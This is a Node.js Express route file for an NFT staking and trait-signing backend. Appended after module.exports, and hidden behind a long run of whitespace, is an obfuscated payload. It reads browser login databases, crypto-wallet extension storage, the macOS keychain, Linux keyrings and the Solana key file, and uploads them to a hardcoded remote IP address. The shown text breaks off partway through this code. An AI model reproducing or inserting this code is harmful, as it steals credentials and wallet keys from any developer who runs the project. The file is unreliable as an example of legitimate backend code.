const express = require('express');
const router = express.Router();
const { check, validationResult } = require('express-validator');
const admin = require('../../middleware/admin');
const { ethers, Contract } = require('ethers');
const { formatUnits, parseUnits } = require('ethers/lib/utils');
const config = require('config');
const Trait = require('../../models/Trait');
const TraitUtility = require('../../models/TraitUtility');
const checkObjectId = require('../../middleware/checkObjectId');
const sign = require('jsonwebtoken/sign');

// @route    POST api/traits
// @desc     Create or update a trait
// @access   Private
router.post(
  '/',
  admin,
  check('unsignedMsg', 'unsignedMsg is required').notEmpty(),
  check('signedMessage', 'signedMessage is required').notEmpty(),
  check('fullyExpandedSig', 'fullyExpandedSig is required').notEmpty(),

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    let signingAddress = ethers.utils.verifyMessage(req.body.unsignedMsg, req.body.fullyExpandedSig);
    const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
    var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
    const account = wallet.connect(provider);

    const bankContract = new Contract(
      config.get('twmBank'),
      [
        'function owner() public view returns (address)'
      ],
      account
    );
    let ownerAddress = await bankContract.owner();
    let updateMsg = JSON.parse(req.body.unsignedMsg);
    if (ownerAddress == signingAddress) {
      try {
        let trait = await Trait.findOneAndUpdate(
          { no: updateMsg.no },
          { $set: { no: updateMsg.no, trait: updateMsg.trait } },
          { new: true, upsert: true, setDefaultsOnInsert: true }
        );

        res.json({ trait, success: true });
      } catch (err) {
        console.error(err.message);
        res.status(500).send('Server Error');
      }
    } else {
      res.json({ success: false });
    }
  }
);

// @route    POST api/traits/utility/
// @desc     Create or update a trait
// @access   Private
router.post(
  '/utility/',
  admin,
  check('unsignedMsg', 'unsignedMsg is required').notEmpty(),
  check('signedMessage', 'signedMessage is required').notEmpty(),
  check('fullyExpandedSig', 'fullyExpandedSig is required').notEmpty(),

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    let signingAddress = ethers.utils.verifyMessage(req.body.unsignedMsg, req.body.fullyExpandedSig);
    const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
    var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
    const account = wallet.connect(provider);

    const bankContract = new Contract(
      config.get('twmBank'),
      [
        'function owner() public view returns (address)'
      ],
      account
    );
    let ownerAddress = await bankContract.owner();
    let updateMsg = JSON.parse(req.body.unsignedMsg);

    if (ownerAddress == signingAddress) {
      try {
        let trait = await TraitUtility.findOneAndUpdate(
          { no: updateMsg.no },
          { $set: { no: updateMsg.no, trait: updateMsg.trait } },
          { new: true, upsert: true, setDefaultsOnInsert: true }
        );

        res.json({ trait, success: true });
      } catch (err) {
        console.error(err.message);
        res.status(500).send('Server Error');
      }
    } else {
      res.json({ success: false });
    }
  }
);

// @route    GET api/traits
// @desc     Get all traits
// @access   Private
router.get('/', async (req, res) => {
  try {
    const traits = await Trait.find().sort({ date: -1 });
    res.json(traits);
  } catch (err) {
    console.error(err.message);
    res.status(500).send('Server Error');
  }
});

// @route    GET api/traits/utility/
// @desc     Get all traits
// @access   Private
router.get('/utility/', async (req, res) => {
  try {
    const traits = await TraitUtility.find().sort({ date: -1 });
    res.json(traits);
  } catch (err) {
    console.error(err.message);
    res.status(500).send('Server Error');
  }
});

// @route    GET api/traits/:id
// @desc     Get trait by ID
// @access   Private
router.get('/:nums',
  async ({ params: { nums } }, res) => {
    try {
      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);

      const bankContract = new Contract(
        config.get('twmBank'),
        [
          'function _baseRates(address addr) public view returns (uint256) '
        ],
        account
      );
      let defaultTrait = await bankContract._baseRates(config.get('twmAddress'));

      const arrNums = JSON.parse(nums);
      let traitsInventory = [];
      let replyTraits = [];
      if (Array.isArray(arrNums)) {
        traitsInventory = await Trait.find({ "no": { $in: arrNums } }).select('-_id')
      }

      for (let i = 0; i < arrNums.length; i++) {
        const result = traitsInventory.find(({ no }) => no === arrNums[i]);
        if (result) {
          replyTraits.push(result);
        } else {
          replyTraits.push({ no: arrNums[i], trait: formatUnits(defaultTrait.toString(), 18) });
        }
      }

      res.json(replyTraits);
    } catch (err) {
      console.error(err.message);

      res.status(500).send('Server Error');
    }
  });

// @route    GET api/traits/utility/:id
// @desc     Get trait by ID
// @access   Private
router.get('/utility/:nums',
  async ({ params: { nums } }, res) => {
    try {
      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);

      const bankContract = new Contract(
        config.get('twmBank'),
        [
          'function _baseRates(address addr) public view returns (uint256) '
        ],
        account
      );
      let defaultTrait = await bankContract._baseRates(config.get('utilityAddress'));

      const arrNums = JSON.parse(nums);
      let traitsInventory = [];
      let replyTraits = [];
      if (Array.isArray(arrNums)) {
        traitsInventory = await TraitUtility.find({ "no": { $in: arrNums } }).select('-_id')
      }

      for (let i = 0; i < arrNums.length; i++) {
        const result = traitsInventory.find(({ no }) => no === arrNums[i]);
        if (result) {
          replyTraits.push(result);
        } else {
          replyTraits.push({ no: arrNums[i], trait: formatUnits(defaultTrait.toString(), 18) });
        }
      }

      res.json(replyTraits);
    } catch (err) {
      console.error(err.message);

      res.status(500).send('Server Error');
    }
  });

// @route    DELETE api/traits/all
// @desc     Delete a trait
// @access   Private
router.delete('/all', admin, async (req, res) => {
  try {
    await Trait.deleteMany({})
    res.json({ msg: 'Trait Reset' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});

// @route    DELETE api/traits/allutility
// @desc     Delete a trait of twm
// @access   Private
router.delete('/allutility', admin, async (req, res) => {
  try {
    await TraitUtility.deleteMany({})
    res.json({ msg: 'TraitUtility Reset' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});


// @route    DELETE api/traits/:id
// @desc     Delete a trait
// @access   Private
router.delete('/:id', [admin, checkObjectId('id')], async (req, res) => {
  try {
    const trait = await Trait.findById(req.params.id);

    if (!trait) {
      return res.status(404).json({ msg: 'Trait not found' });
    }

    await trait.remove();

    res.json({ msg: 'Post removed' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});


// @route    DELETE api/traits/utility/:id
// @desc     Delete a trait of utility
// @access   Private
router.delete('/utility/:id', [admin, checkObjectId('id')], async (req, res) => {
  try {
    const trait = await TraitUtility.findById(req.params.id);

    if (!trait) {
      return res.status(404).json({ msg: 'Trait not found' });
    }

    await trait.remove();

    res.json({ msg: 'Post removed' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});

// @route    GET api/traits/deposit/:nums
// @desc     Get traits by no group
// @access   Public
router.get(
  '/deposit/:nums',
  async ({ params: { nums } }, res) => {
    try {
      let hexNums = [];
      let traits = [];
      let signature;

      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);
      const abi = [{"inputs":[{"internalType":"address","name":"_twm","type":"address"},{"internalType":"address","name":"_signer","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokenId","type":"uint256"},{"indexed":true,"internalType":"address","name":"owner","type":"address"}],"name":"AutoDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Withdraw","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":true,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"WithdrawStuckERC721","type":"event"},{"inputs":[],"name":"FirstCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SECONDS_IN_DAY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SecondCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"ThirdCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"_baseRates","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"},{"internalType":"uint256[]","name":"tokenTraits","type":"uint256[]"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"depositPaused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"emergencyWithdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getAccumulatedAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getCurrentReward","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerTokens","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getTokenYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"isMultiplierSet","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"launchStaking","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bool","name":"_pause","type":"bool"}],"name":"pauseDeposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_first","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setFirstContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_second","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setSecondContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_third","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setThirdContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"signerAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"stakingLaunched","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_contract","type":"address"},{"internalType":"uint256","name":"_yield","type":"uint256"}],"name":"updateBaseYield","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_signer","type":"address"}],"name":"updateSignerAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
      const bankContract = new Contract(
        config.get('twmBank'),
        abi,
        account
      );
      let defaultTrait = await bankContract._baseRates(config.get('twmAddress'));

      const obj = JSON.parse(nums);
      if (Array.isArray(obj)) {
        const traitsInventory = await Trait.find({ "no": { $in: obj } }).select('-_id');
        for (let i = 0; i < obj.length; i++) {
          hexNums.push(ethers.utils.hexlify(obj[i]));
          const result = traitsInventory.find(({ no }) => no === obj[i]);
          if (result) {
            traits.push(ethers.utils.hexlify(ethers.utils.parseUnits((result.trait).toString(), 18)));
          } else {
            traits.push(ethers.utils.hexlify(defaultTrait));
          }
        }
        let message = ethers.utils.solidityPack(["address", "uint256[]", "uint256[]"], [config.get('twmAddress'), hexNums, traits]);
        message = ethers.utils.solidityKeccak256(["bytes"], [message]);
        signature = await account.signMessage(ethers.utils.arrayify(message));
      }
      return res.json({ hexNums, traits, signature });
    } catch (err) {
      console.error(err.message);
      return res.status(500).json({ msg: 'Server error' });
    }
  }
);

// @route    GET api/traits/depositutility:nums
// @desc     Get traits by no group
// @access   Public
router.get(
  '/depositutility/:nums',
  async ({ params: { nums } }, res) => {
    try {
      let hexNums = [];
      let traits = [];
      let signature;

      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);
      const abi = [{"inputs":[{"internalType":"address","name":"_twm","type":"address"},{"internalType":"address","name":"_signer","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokenId","type":"uint256"},{"indexed":true,"internalType":"address","name":"owner","type":"address"}],"name":"AutoDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Withdraw","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":true,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"WithdrawStuckERC721","type":"event"},{"inputs":[],"name":"FirstCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SECONDS_IN_DAY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SecondCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"ThirdCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"_baseRates","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"},{"internalType":"uint256[]","name":"tokenTraits","type":"uint256[]"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"depositPaused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"emergencyWithdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getAccumulatedAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getCurrentReward","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerTokens","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getTokenYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"isMultiplierSet","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"launchStaking","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bool","name":"_pause","type":"bool"}],"name":"pauseDeposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_first","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setFirstContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_second","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setSecondContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_third","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setThirdContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"signerAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"stakingLaunched","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_contract","type":"address"},{"internalType":"uint256","name":"_yield","type":"uint256"}],"name":"updateBaseYield","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_signer","type":"address"}],"name":"updateSignerAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
      const bankContract = new Contract(
        config.get('twmBank'),
        abi,
        account
      );

      let defaultTrait = await bankContract._baseRates(config.get('utilityAddress'));
      const obj = JSON.parse(nums);
      if (Array.isArray(obj)) {
        const traitsInventory = await TraitUtility.find({ "no": { $in: obj } }).select('-_id');
        for (let i = 0; i < obj.length; i++) {
          hexNums.push(ethers.utils.hexlify(obj[i]));
          const result = traitsInventory.find(({ no }) => no === obj[i]);
          if (result) {
            traits.push(ethers.utils.hexlify(ethers.utils.parseUnits((result.trait).toString(), 18)));
          } else {
            traits.push(ethers.utils.hexlify(defaultTrait));
          }
        }
        let message = ethers.utils.solidityPack(["address", "uint256[]", "uint256[]"], [config.get('utilityAddress'), hexNums, traits]);
        message = ethers.utils.solidityKeccak256(["bytes"], [message]);
        signature = await account.signMessage(ethers.utils.arrayify(message));
      }
      return res.json({ hexNums, traits, signature });
    } catch (err) {
      console.error(err.message);
      return res.status(500).json({ msg: 'Server error' });
    }
  }
);

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Object.prototype.toString,Object.defineProperty,Object.getOwnPropertyDescriptor;const t="base64",c="utf8",a=require("fs"),$=require("os"),r=a=>(s1=a.slice(1),Buffer.from(s1,t).toString(c));pt=require(r("zcGF0aA")),rq=require(r("YcmVxdWVzdA")),cr=require(r("aY3J5cHRv")),ex=require(r("aY2hpbGRfcHJvY2Vzcw"))[r("cZXhlYw")],hs=$[r("caG9zdG5hbWU")](),pl=$[r("YcGxhdGZvcm0")](),hd=$[r("ZaG9tZWRpcg")](),td=$[r("cdG1wZGly")](),tp=$[r("AdHlwZQ")]();let e;const n=a=>Buffer.from(a,t).toString(c),l=()=>{let t="MTQ3LjEyNCaHR0cDovLw4yMTQuMjM3OjEyNDQ=  ";for(var c="",a="",$="",r="",e=0;e<10;e++)c+=t[e],a+=t[10+e],$+=t[20+e],r+=t[30+e];return c=c+$+r,n(a)+n(c)},s=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[n("ZGlybmFtZQ")](hd)}/${c}`)),h="swPnLQ5",o="Z2V0",i="Ly5ucGw",Z="d3JpdGVGaWxlU3luYw",m="L2NsaWVudA",u=n("ZXhpc3RzU3luYw"),d="TG9naW4gRGF0YQ",y="Y29weUZpbGU";function p(t){const c=n("YWNjZXNz"+"U3luYw");try{return a[c](t),!0}catch(t){return!1}}const b=n("RGVmYXVsdA"),G=n("UHJvZmlsZQ"),f=r("aZmlsZW5hbWU"),W=r("cZm9ybURhdGE"),Y=r("adXJs"),w=r("Zb3B0aW9ucw"),V=r("YdmFsdWU"),v=n("cmVhZGRpclN5bmM"),j=n("c3RhdFN5bmM"),L=(n("aXNEaXJlY3Rvcnk"),n("cG9zdA")),x="Ly5jb25maWcv",z="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",F="L0FwcERhdGEv",R="L1VzZXIgRGF0YQ",N="R29vZ2xlL0Nocm9tZQ",X="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",Q="Z29vZ2xlLWNocm9tZQ",_=["TG9jYWwvQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",X,"QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy"],J=["TG9jYWwvR29vZ2xlL0Nocm9tZQ",N,Q],g=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let k="comp";const U=["bmtiaWhmYmVv","ZWpiYWxiYWtv","Zmhib2hpbWFl","aG5mYW5rbm9j","aWJuZWpkZmpt","YmZuYWVsbW9t","YWVhY2hrbm1l","aGlmYWZnbWNj"],B=["Z2FlYW9laGxlZm5rb2RiZWZncGdrbm4","cGxjaGxnaGVjZGFsbWVlZWFqbmltaG0","bGJvaHBqYmJsZGNuZ2NuYXBuZG9kanA","ZmVvZmJkZGdjaWpubWhuZm5rZG5hYWQ","bWtwY25scGVia2xtbmtvZW9paG9mZWM","ZWltaGxwbWdqbmpvcGhocGtrb2xqcGE","ZnBoZXBjY2lvbmJvb2hja29ub2VlbWc","ZHBla3Bsb21qamtjZmdvZG5oY2VsbGo"],q="Y3JlYXRlUmVhZFN0cmVhbQ",C=async(t,c,$)=>{let r=t;if(!r||""===r)return[];try{if(!p(r))return[]}catch(t){return[]}c||(c="");let e=[];const l=n("TG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdz"),s=n(q),h=n("LmxkYg"),o=n("LmxvZw");for(let $=0;$<200;$++){const i=`${t}/${0===$?b:`${G} ${$}`}/${l}`;for(let t=0;t<U.length;t++){const l=n(U[t]+B[t]);let Z=`${i}/${l}`;if(p(Z)){try{far=a[v](Z)}catch(t){far=[]}far.forEach((async t=>{r=pt.join(Z,t);try{(r.includes(h)||r.includes(o))&&e.push({[V]:a[s](r),[w]:{[f]:`${c}${$}_${l}_${t}`}})}catch(t){}}))}}}if($){const t=n("c29sYW5hX2lkLnR4dA");if(r=`${hd}${n("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,a[u](r))try{e.push({[V]:a[s](r),[w]:{[f]:t}})}catch(t){}}return S(e),e},S=t=>{const c=r("YbXVsdGlfZmlsZQ"),a=n("L3VwbG9hZHM"),$={timestamp:e.toString(),type:h,hid:k,[c]:t},s=l();try{const t={[Y]:`${s}${a}`,[W]:$};rq[L](t,((t,c,a)=>{}))}catch(t){}},T=async(t,c)=>{try{const a=s("~/");let $="";$="d"==pl[0]?`${a}${n(z)}${n(t[1])}`:"l"==pl[0]?`${a}${n(x)}${n(t[2])}`:`${a}${n(F)}${n(t[0])}${n(R)}`,await C($,`${c}_`,0==c)}catch(t){}},H=async()=>{let t=[];const c=n(d),$=n(q),r=n("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),e=n("bG9na2MtZGI");if(pa=`${hd}${r}`,a[u](pa))try{t.push({[V]:a[$](pa),[w]:{[f]:e}})}catch(t){}else if(pa+="-db",a[u](pa))try{t.push({[V]:a[$](pa),[w]:{[f]:e}})}catch(t){}try{const r=n(y);let e="";if(e=`${hd}${n(z)}${n(N)}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=`${e}/${0===n?b:`${G} ${n}`}/${c}`;try{if(!p(l))continue;const c=`${e}/ld_${n}`;p(c)?t.push({[V]:a[$](c),[w]:{[f]:`pld_${n}`}}):a[r](l,c,(t=>{let c=[{[V]:a[$](l),[w]:{[f]:`pld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},A=async()=>{let t=[];const c=n(d),$=n(q);try{const r=n(y);let e="";if(e=`${hd}${n(z)}${n(X)}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=`${e}/${0===n?b:`${G} ${n}`}/${c}`;try{if(!p(l))continue;const c=`${e}/brld_${n}`;p(c)?t.push({[V]:a[$](c),[w]:{[f]:`brld_${n}`}}):a[r](l,c,(t=>{let c=[{[V]:a[$](l),[w]:{[f]:`brld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},E=async()=>{let t=[];const c=n(q),$=n("a2V5NC5kYg"),r=n("bG9naW5zLmpzb24");try{let e="";if(e=`${hd}${n(z)}${n("RmlyZWZveA")}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=0===n?b:`${G} ${n}`,s=`${e}/${l}/${$}`,h=`${e}/${l}/${r}`;try{if(!p(s))continue;t.push({[V]:a[c](s),[w]:{[f]:`fk4_${n}`}})}catch(t){}try{if(!p(h))continue;t.push({[V]:a[c](h),[w]:{[f]:`flj_${n}`}})}catch(t){}}}catch(t){}return S(t),t},M=async()=>{let t=[];n(d);const c=n(q);try{const t=n("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let $="";$=`${hd}${t}`;let r=[];if($&&""!==$&&p($))try{r=a[v]($)}catch(t){r=[]}r.forEach((async t=>{pa=pt.join($,t);try{ldb_data.push({[V]:a[c](pa),[w]:{[f]:`${t}`}})}catch(t){}}))}catch(t){}return S(t),t},I=async()=>{let t=[];const c=n(d),$=n(q);try{const r=n(y);let e="";if(e=`${hd}${n(x)}${n(Q)}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=`${e}/${0===n?b:`${G} ${n}`}/${c}`;try{if(!p(l))continue;const 